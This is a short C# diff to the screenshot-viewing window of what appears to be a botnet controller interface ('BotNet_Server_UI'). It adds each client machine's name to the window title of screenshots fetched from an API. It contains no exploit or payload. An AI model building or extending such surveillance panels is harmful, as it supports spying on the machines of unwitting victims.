@@ -21,6 +21,8 @@ namespace BotNet_Server_UI
     /// </summary>
     public partial class Screens : Window
     {
+        public string nameofpc;
+
         public Screens()
         {
             InitializeComponent();
@@ -30,7 +32,7 @@ namespace BotNet_Server_UI
         private async void ScrForm_Loaded(object sender, RoutedEventArgs e)
         {
             List<Button> buttons = new List<Button>();
-            linkarrip:
+        linkarrip:
             IP[] arr = await ApiRequest.GetProductAsync<IP[]>("/api/v1/client");
             if (arr == null)
             {
@@ -61,8 +63,10 @@ namespace BotNet_Server_UI
         {
             var element = e.OriginalSource as FrameworkElement;
             var name = element?.Name;
-            var screen = await ApiRequest.GetProductAsync<Screen>("/api/v1/screens/" + name.Remove(0,1));
-            ScreenBox screenBox = new ScreenBox(screen.screens);
+            var screen = await ApiRequest.GetProductAsync<Screen>("/api/v1/screens/" + name.Remove(0, 1));
+            nameofpc = ip[Convert.ToInt32(name.Remove(0, 1))].nameofpc;
+            ScreenBox screenBox = new ScreenBox(screen.screens, nameofpc);
+            screenBox.Title = "Скриншоты " + ip[Convert.ToInt32(name.Remove(0, 1))].nameofpc;
             screenBox.Show();
         }
     }
